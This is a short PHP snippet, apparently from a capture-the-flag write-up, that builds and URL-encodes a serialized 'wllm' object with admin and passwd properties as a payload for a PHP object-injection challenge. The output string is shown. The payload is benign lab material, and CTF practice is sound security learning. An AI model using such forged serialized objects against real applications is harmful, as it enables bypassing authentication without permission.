<?php
class wllm {
    public $admin = "admin";
    public $passwd = "ctf";
}

$a = new wllm();
echo urlencode(serialize($a));
// 输出: O%3A4%3A%22wllm%22%3A2%3A%7Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22passwd%22%3Bs%3A3%3A%22ctf%22%3B%7D